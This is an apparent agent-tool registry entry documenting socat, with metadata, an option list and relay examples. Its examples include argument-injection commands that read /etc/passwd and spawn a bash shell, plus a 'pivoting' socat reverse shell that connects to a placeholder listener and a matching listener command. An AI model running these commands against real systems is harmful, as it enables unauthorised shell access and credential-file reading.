---
id: network-socket-socat
namespace: network:socket:socat
name: socat
description: Multipurpose relay tool for bidirectional data transfer between sockets,
  pipes, files, and serial ports with SSL support.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - network.socket.proxy
  - network.socket.ssl
  - network.socket.relay
  - network.port.redirect
  - network.socket.udp
  - network.serial.connect
  - network.socket.forward
  - security.execution.command
  - security.privilege-escalation.shell
  - system.file.read
platforms:
  - linux
  - macos
  - cross-platform
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies: []
related_tools:
  - netcat
  - ssh
  - nginx
  - ncat
  - network-socket-nc
artifacts:
  - type: network.socket.data
    description: Data relayed through the socat connection
    mime: text/plain
    trust_level: community
workflow_edges:
  produces:
    - relayed-data
  consumes:
    - source-address
    - target-address
contract:
  inputs:
    - type: network.address.source
      description: Source address specification
    - type: network.address.target
      description: Target address specification
  outputs:
    - type: network.socket.data
      description: Data transferred between endpoints
      mime: text/plain
  side_effects:
    - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 8
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: low
  disk_io: low
allowed-tools:
  - socat
  - Bash
  - execFile

parameters:
  - name: flag-h
    type: array
    required: false
    description: "like -h, plus a list of all common address option names -hhh like
      -hh, plus a list of all available address option names -d[ddd] increase verbosity
      (use up to 4 times; 2 are recommended) -d0|1|2|3|..."
    aliases:
      - -h
      - -?

  - name: "0"
    type: boolean
    required: false
    description: "do not prefer an IP version"
    aliases:
      - "-0"
  - name: "4"
    type: boolean
    required: false
    description: "prefer IPv4 if version is not explicitly specified"
    aliases:
      - "-4"
  - name: "6"
    type: boolean
    required: false
    description: "prefer IPv6 if version is not explicitly specified"
    aliases:
      - "-6"
  - name: D
    type: boolean
    required: false
    description: "analyze file descriptors before loop"
    aliases:
      - "-D"
  - name: L
    type: boolean
    required: false
    description: "try to obtain lock, or fail"
    aliases:
      - "-L"
  - name: R
    type: boolean
    required: false
    description: "raw dump of data flowing from right to left"
    aliases:
      - "-R"
  - name: S
    type: boolean
    required: false
    description: "log these signals, override default"
    aliases:
      - "-S"
  - name: T
    type: boolean
    required: false
    description: "total inactivity timeout in seconds"
    aliases:
      - "-T"
  - name: U
    type: boolean
    required: false
    description: "unidirectional mode (right to left)"
    aliases:
      - "-U"
  - name: V
    type: boolean
    required: false
    description: "print version and feature information to stdout, and exit"
    aliases:
      - "-V"
  - name: W
    type: boolean
    required: false
    description: "try to obtain lock, or wait"
    aliases:
      - "-W"
  - name: b
    type: boolean
    required: false
    description: "set data buffer size (8192)"
    aliases:
      - "-b"
  - name: d
    type: boolean
    required: false
    description: "increase verbosity (use up to 4 times; 2 are recommended)"
    aliases:
      - "-d"
  - name: d0
    type: boolean
    required: false
    description: "|1|2|3|4    set verbosity level (0: Errors; 4 all including Debug)"
    aliases:
      - "-d0"
  - name: experimental
    type: boolean
    required: false
    description: "enable experimental features"
    aliases:
      - "--experimental"
  - name: g
    type: boolean
    required: false
    description: "do not check option groups"
    aliases:
      - "-g"
  - name: hh
    type: boolean
    required: false
    description: "plus a list of all common address option names"
    aliases:
      - "-hh"
      - "-h"
  - name: hhh
    type: boolean
    required: false
    description: "plus a list of all available address option names"
    aliases:
      - "-hhh"
      - "-hh"
  - name: lf
    type: boolean
    required: false
    description: "log to file"
    aliases:
      - "-lf"
  - name: lh
    type: boolean
    required: false
    description: "add hostname to log messages"
    aliases:
      - "-lh"
  - name: lm
    type: boolean
    required: false
    description: "mixed log mode (stderr during initialization, then syslog)"
    aliases:
      - "-lm"
  - name: lp
    type: boolean
    required: false
    description: "set the program name used for logging and vars"
    aliases:
      - "-lp"
  - name: ls
    type: boolean
    required: false
    description: "log to stderr (default if no other log)"
    aliases:
      - "-ls"
  - name: lu
    type: boolean
    required: false
    description: "use microseconds for logging timestamps"
    aliases:
      - "-lu"
  - name: ly
    type: boolean
    required: false
    description: "log to syslog, using facility (default is daemon)"
    aliases:
      - "-ly"
  - name: r
    type: boolean
    required: false
    description: "raw dump of data flowing from left to right"
    aliases:
      - "-r"
  - name: s
    type: boolean
    required: false
    description: "sloppy"
    aliases:
      - "-s"
  - name: t
    type: boolean
    required: false
    description: "wait seconds before closing second channel"
    aliases:
      - "-t"
  - name: u
    type: boolean
    required: false
    description: "unidirectional mode (left to right)"
    aliases:
      - "-u"
  - name: v
    type: boolean
    required: false
    description: "verbose text dump of data traffic"
    aliases:
      - "-v"
  - name: x
    type: boolean
    required: false
    description: "verbose hexadecimal dump of data traffic"
    aliases:
      - "-x"

features:
  - output-json
  - remote
  - network-intensive
  - file-system
  - process-manip
techniques:
  - command-and-control
  - lateral-movement
  - collection
  - execution
  - privilege-escalation
execution:
  template: "socat {flag-h}"
  sandbox: execFile
  timeout_seconds: 120
  shell: false
global_vars:
  target: ip
  port: port
examples:
  - description: "Simple TCP port forwarder"
    command: "socat TCP-LISTEN:8080,fork TCP:localhost:80"
  - description: "Expose local HTTP server through SSL tunnel"
    command: "socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:localhost:8080"
  - description: "Create a UNIX socket proxy"
    command: "socat UNIX-LISTEN:/tmp/proxy.sock,fork TCP:remote:3306"
  - description: "Read/write to serial port"
    command: "socat - /dev/ttyUSB0,raw,nonblock,echo=0,crnl"
  - description: "UDP port forward"
    command: "socat UDP-RECVFROM:5000,fork UDP-SENDTO:localhost:6000"
  - description: "Bidirectional relay between two sockets"
    command: "socat TCP:localhost:8080 TCP:remote:9090"
  - description: The command leverages socats ability to relay data, reading arbitary
      file by opening it in read-only mode.
    command: "socat -u OPEN:/etc/passwd,rdonly STDOUT\n"
  - description: The exec argument runs an arbitrary command and spawn a shell.
    command: "socat stdin exec:bash\n"
  - description: The exec argument runs an arbitrary command.
    command: "socat stdin exec:whoami\n"
  - description: 'Argument injection: read local file: The command leverages socats
      ability to relay data, reading arbitary file by opening it in read-only mode.'
    command: socat -u OPEN:/etc/passwd,rdonly STDOUT
  - description: 'Argument injection: spawn interactive shell: The exec argument runs
      an arbitrary command and spawn a shell.'
    command: socat stdin exec:bash
  - description: 'Argument injection: execute arbitrary command: The exec argument
      runs an arbitrary command.'
    command: socat stdin exec:whoami
  - description: 'Darkiros PIVOTING: socat port forwarding listener (on local machine)'
    command: ./socat TCP-LISTEN:[port_listener],fork,reuseaddr TCP-LISTEN:[port_to_forward]
  - description: 'Darkiros PIVOTING: socat port forwarding connect (on remote machine)'
    command: socat TCP:[connect_ip]:[connect_port] TCP:127.0.0.1:[port_to_forward]
  - description: 'Darkiros PIVOTING: socat reverse shell (remote victime)'
    command: ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[listner_ip]:[listner_port]
  - description: 'Darkiros PIVOTING: socat reverse shell (local listener)'
    command: socat file:`tty`,raw,echo=0 tcp-listen:[port|4444]
references:
  - label: "Socat documentation"
    url: "http://www.dest-unreach.org/socat/doc/socat.html"
  - label: "Socat examples"
    url: "http://www.dest-unreach.org/socat/doc/socat-multicast.html"
install:
    - method: apt
      package_name: "socat"
      commands:
        - "apt-get install -y socat"
---


# Socat — Multipurpose Socket Relay

Socat (SOcket CAT) is a powerful networking tool that establishes bidirectional data channels between two endpoints. It can connect nearly any type of I/O endpoint: TCP, UDP, SSL, UNIX sockets, pipes, files, serial ports, and executables.

## Address Types

| Type | Syntax | Description |
|------|--------|-------------|
| TCP | `TCP:host:port` | TCP client connection |
| TCP-LISTEN | `TCP-LISTEN:port` | TCP server listener |
| UDP | `UDP:host:port` | UDP datagram |
| UNIX | `UNIX-CONNECT:/path` | UNIX socket client |
| UNIX-LISTEN | `UNIX-LISTEN:/path` | UNIX socket server |
| SSL | `OPENSSL:host:port` | SSL/TLS connection |
| STDIO | `STDIO` | Standard input/output |
| EXEC | `EXEC:cmd` | Execute a program |
| FILE | `FILE:/path` | Open a file |
| SERIAL | `/dev/ttyUSB0` | Serial port |

## Common Patterns

### Port Forwarding
```bash
# Forward local port to remote
socat TCP-LISTEN:8080,reuseaddr,fork TCP:remote-server:80

# WITH SSL (decrypt at proxy)
socat TCP-LISTEN:8443,reuseaddr,fork OPENSSL:backend:443
```

### Network Debugging
```bash
# Echo server for testing
socat TCP-LISTEN:9999,reuseaddr,fork EXEC:cat

# Hex dump of traffic
socat -v TCP-LISTEN:8080,fork TCP:localhost:80
```

### Security
```bash
# SSL-terminated port forward
socat OPENSSL-LISTEN:443,cert=fullchain.pem,key=privkey.pem,verify=0,fork TCP:localhost:8080

# Encrypted tunnel between two machines
socat TCP-LISTEN:4443,reuseaddr TCP:localhost:4444
```

## Related Tools

- **[netcat (nc)](../socket/nc.md)** — Simple socket connections
- **[ncat](../../socket/ncat.md)** — Modern netcat with SSL
- **[ssh](../../remote/ssh.md)** — Encrypted tunneling with authentication
- **[haproxy](../../proxy/haproxy.md)** — Production-grade TCP/HTTP proxy
